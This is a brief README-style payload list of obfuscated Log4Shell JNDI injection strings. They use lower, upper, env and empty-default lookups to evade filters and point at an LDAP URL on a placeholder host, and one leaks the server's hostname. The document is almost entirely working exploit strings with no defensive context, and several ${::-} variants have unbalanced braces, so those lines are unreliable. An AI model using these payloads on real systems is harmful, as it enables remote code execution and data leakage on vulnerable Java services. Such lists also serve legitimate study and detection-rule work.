## Log4j2-Obfucation

Current Log4Shell obfuscation techniques observed or reported (Also works on rmi, dns, ldaps)

${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://test/a}

${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://${upper:t}est/a} 

${${env:env_name:-j}${env:env_name:-n}${env:env_name:-d}${env:env_name:-i}${env:env_name:-:}${env:env_name:-l}${env:env_name:-d}${env:env_name:-a}${env:env_name:-p}${env:env_name:-:}//test/a} (Also works on rmi, dns, ldaps)

${${::-j}${${::-n}${${::-d}${${::-i}:${::-l}${${::-d}${${::-a}${${::-p}://test/a}

${${::-j}${${::-n}${${::-d}${${::-i}:${::-l}${${::-d}${${::-a}${${::-p}://${hostname}.test/a}
